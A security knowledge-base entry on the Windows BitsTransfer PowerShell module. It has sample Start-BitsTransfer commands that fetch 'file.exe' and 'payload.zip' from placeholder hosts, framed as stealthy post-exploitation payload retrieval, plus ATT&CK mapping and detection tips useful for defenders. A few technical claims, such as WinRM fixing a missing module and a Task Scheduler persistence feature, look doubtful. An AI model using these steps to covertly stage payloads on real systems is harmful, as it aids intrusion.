---
id: a31c39da-20bd-4c50-82df-e733416c97ff
name: bitstransfer
type: tool
verified: true
created_at: '2020-03-06T02:32:34.551091+00:00'
updated_at: '2023-05-30T19:54:07.705054+00:00'
platforms:
  - Windows
tags:
  - file-transfer
  - network
  - powershell
url: 'https://learn.microsoft.com/en-us/powershell/module/bitstransfer/'
commands:
  - '[[commands/bitstransfer-download-file-from-web-server]]'
validated: true
---

# BitsTransfer

**Status**: ✓ Verified

## Overview

BitsTransfer is a PowerShell module that leverages the Background Intelligent Transfer Service (BITS) to manage asynchronous file transfers between systems. It is commonly used in security testing for downloading files or payloads from remote servers in a way that blends with normal system activity, as BITS jobs run in the background and can resume interrupted transfers. Ideal for post-exploitation scenarios where stealthy file retrieval is needed without alerting endpoint detection tools.

## Description

The BitsTransfer module provides cmdlets to create, monitor, and complete BITS jobs, which use idle network bandwidth for transfers. Key cmdlets include Start-BitsTransfer for initiating downloads/uploads, Get-BitsTransfer for monitoring progress, Complete-BitsTransfer to finalize jobs, and others like Resume-BitsTransfer, Suspend-BitsTransfer, Remove-BitsTransfer, and Set-BitsTransfer. This makes it suitable for transferring tools or data over HTTP/HTTPS/SMB in environments where direct downloads might be restricted or monitored.

## Features

- Asynchronous file transfers using idle bandwidth
- Support for HTTP, HTTPS, SMB, and other protocols
- Job management: pause, resume, prioritize, and monitor transfers
- Multi-file transfer capabilities
- Integration with Windows Task Scheduler for persistence
- Credential support for authenticated transfers

## Installation

### Requirements

- Windows operating system with PowerShell 2.0 or later (included by default on Windows 7+ and Server 2008 R2+)
- Administrative privileges not required for basic usage, but may be needed for certain job configurations

### Install Commands

BitsTransfer is built into PowerShell and requires no separate installation. Simply import the module:

```powershell
Import-Module BitsTransfer
```

If the module is not available (rare on modern Windows), ensure Windows Remote Management (WinRM) features are enabled via Server Manager or DISM.

## Basic Usage

```powershell
Get-Command -Module BitsTransfer
```

### Common Options

| Option | Description |
|--------|-------------|
| `-Asynchronous` | Run the transfer in the background (default for Start-BitsTransfer) |
| `-Priority` | Set job priority (Foreground, High, Normal, Low) |
| `-Credential` | Specify credentials for authenticated sources |
| `-ProxyUsage` | Configure proxy settings (NoProxy, SystemSetting, NoProxyOnLocal) |

## Examples

### Example 1: Basic Usage

Start a simple download job:

```powershell
Start-BitsTransfer -Source "http://example.com/file.exe" -Destination "C:\temp\file.exe"
```

### Example 2: Advanced Usage

Download with credentials and monitor progress:

```powershell
$cred = Get-Credential
$job = Start-BitsTransfer -Source "https://secure.example.com/payload.zip" -Destination "payload.zip" -Credential $cred -Priority High
Get-BitsTransfer -JobId $job.JobId | Format-List
Complete-BitsTransfer -JobId $job.JobId
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Remote File Copy]] Ingress Tool Transfer
- [[T1566.001]] Phishing: Spearphishing Attachment (for payload delivery)

### Tactics

- [[Execution]] Execution
- [[Command and Control]] Command and Control

## Detection

Indicators and methods for detecting this tool's usage:

- Monitor PowerShell execution logs for Import-Module BitsTransfer or Start-BitsTransfer cmdlets
- Look for BITS job creation via Event ID 59/60 in Microsoft-Windows-Bits-Client/Operational log
- Network traffic to unusual HTTP/HTTPS endpoints with file download patterns
- File system changes in temp directories from completed BITS jobs
- Use Sysmon or EDR to track PowerShell process spawning BITS-related activities

## Related Procedures

No related procedures linked yet.

## Related Tools

- [[PowerShell]]
- [[certutil]]

## References

- Official documentation: https://learn.microsoft.com/en-us/powershell/module/bitstransfer/
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1105/
